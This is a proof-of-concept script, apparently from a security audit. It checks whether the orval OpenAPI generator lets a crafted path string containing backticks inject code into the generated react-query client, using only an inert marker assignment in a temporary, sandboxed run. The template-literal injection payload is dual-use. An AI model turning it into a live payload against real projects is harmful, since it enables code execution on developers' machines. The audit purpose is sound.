// Run from the repository root: node docs/security-audit/orval-poc.mjs
// Only assigns an in-memory marker. Generates into an OS temp directory, makes
// no network requests, and leaves the real API specification/client untouched.
import { createRequire } from "node:module";
import { mkdtemp, readFile, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import vm from "node:vm";

const require = createRequire(resolve("frontend/package.json"));
const { generate } = require("orval");
const ts = require("typescript");
const directory = await mkdtemp(join(tmpdir(), "prs-orval-audit-"));
try {
  const payload =
    '/audit/` + (globalThis.__PRS_AUDIT_MARKER__ = "executed") + `/end';
  const spec = {
    openapi: "3.0.3",
    info: { title: "Inert audit fixture", version: "1.0.0" },
    paths: {
      [payload]: {
        get: {
          operationId: "auditProbe",
          responses: { 200: { description: "ok" } },
        },
      },
    },
  };
  const input = join(directory, "input.json");
  const output = join(directory, "client.ts");
  await writeFile(input, JSON.stringify(spec));
  await generate({
    input,
    output: {
      target: output,
      client: "react-query",
      httpClient: "axios",
      mode: "single",
      override: { query: { version: 5 } },
    },
  });
  const source = await readFile(output, "utf8");
  const javascript = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
    },
  }).outputText;
  const context = vm.createContext({ exports: {}, require });
  vm.runInContext(javascript, context);
  context.exports.getAuditProbeQueryKey();
  const result = {
    package: require("orval/package.json").version,
    client: "react-query/axios",
    marker: context.__PRS_AUDIT_MARKER__,
    triggered: context.__PRS_AUDIT_MARKER__ === "executed",
  };
  console.log(JSON.stringify(result));
  const expectVulnerable = process.argv.includes("--expect-vulnerable");
  if (result.triggered !== expectVulnerable) process.exitCode = 1;
} finally {
  delete globalThis.__PRS_AUDIT_MARKER__;
  await rm(directory, { recursive: true, force: true });
}
